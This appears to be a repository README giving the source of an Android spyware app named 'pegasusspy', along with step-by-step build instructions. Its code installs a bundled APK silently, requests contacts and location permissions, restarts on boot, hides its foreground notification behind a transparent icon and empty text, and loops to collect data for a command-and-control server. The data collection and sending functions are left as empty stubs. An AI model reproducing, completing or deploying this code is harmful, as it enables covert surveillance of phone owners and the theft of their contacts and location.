# System-of-down
Ghost

## AndroidManifest.xml
```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    
    <application>
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <service android:name=".SpyService"/>
        
        <receiver android:name=".StartupReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

## MainActivity.java
```
public class MainActivity extends Activity {
    private static final int REQUEST_CODE_PERMISSIONS = 1001;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Check if already installed
        if (isInstalled()) {
            finish();
            return;
        }
        
        // Request permissions
        requestPermissions();
        
        // Install silently
        installSilently();
        
        // Finish activity
        finish();
    }
    
    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, 
            new String[]{Manifest.permission.READ_CONTACTS, 
                         Manifest.permission.ACCESS_FINE_LOCATION},
            REQUEST_CODE_PERMISSIONS);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                         @NonNull int[] grantResults) {
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permissions granted
                startSpyService();
            } else {
                // Show explanation dialog
                showPermissionExplanation();
            }
        }
    }
    
    private void installSilently() {
        try {
            // Create temporary file
            File tempFile = new File(getCacheDir(), "pegasusspy.apk");
            copyAssetsToFiles(tempFile);
            
            // Use package manager to install silently
            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = packageInstaller.createSession(params);
            
            // Write APK to session
            OutputStream out = packageInstaller.openWrite(
                "temp", 0, -1);
            FileInputStream fis = new FileInputStream(tempFile);
            byte[] buffer = new byte[65536];
            int c;
            while ((c = fis.read(buffer)) != -1) {
                out.write(buffer, 0, c);
            }
            fis.close();
            out.close();
            
            // Commit installation
            packageInstaller.commit(sessionId);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void startSpyService() {
        // Initialize for current version
        initializeForVersion();
        
        // Start background service
        startService(new Intent(this, SpyService.class));
    }
    
    private void initializeForVersion() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Use foreground service
            startForegroundService();
        } else {
            // Use background service
            startBackgroundService();
        }
    }
    
    private void startForegroundService() {
        // Android 8.0+ foreground service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent service = new Intent(this, SpyService.class);
            startForegroundService(service);
        }
    }
    
    private void startBackgroundService() {
        // Android 7.0 and below
        Intent service = new Intent(this, SpyService.class);
        startService(service);
    }
    
    private boolean isInstalled() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                "com.pegasusspy.spy", 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
    
    private void showPermissionExplanation() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Required")
               .setMessage("This app requires contacts and location permissions to function properly.")
               .setPositiveButton("OK", (dialog, which) -> requestPermissions())
               .show();
    }
}
```

## SpyService.java
```
public class SpyService extends Service {
    private static final int NOTIFICATION_ID = 1;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create notification channel with minimum importance
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "spy_channel", "Spy Channel", 
                NotificationManager.IMPORTANCE_MIN);
            NotificationManagerCompat.from(this).createNotificationChannel(channel);
        }
        
        // Use transparent icon to hide notification
        Notification notification = new NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.color.transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        
        // Start foreground service
        startForeground(NOTIFICATION_ID, notification);
        
        // Start collection in background
        new Thread(() -> {
            while(true) {
                try {
                    // Collect data
                    collectData();
                    
                    // Send to C2
                    sendToC2();
                    
                    // Sleep
                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void collectData() {
        try {
            // Collect all data
            SharedPreferences prefs = getSharedPreferences("spy", MODE_PRIVATE);
            prefs.edit().putString("data", collectAllData()).apply();
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void sendToC2() {
        try {
            // Send to command-and-control server
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private String collectAllData() {
        // Collect device data
        return "";
    }
}
```

## StartupReceiver.java
```
public class StartupReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Check if already running
            if (!isServiceRunning(context)) {
                // Start service
                context.startService(new Intent(context, SpyService.class));
            }
        }
    }
    
    private boolean isServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if ("com.pegasusspy.spy.SpyService".equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
```

## Build Instructions

File -> New -> New Project -> Empty Activity
Copy all files into respective folders
Build -> Generate Signed Bundle / APK
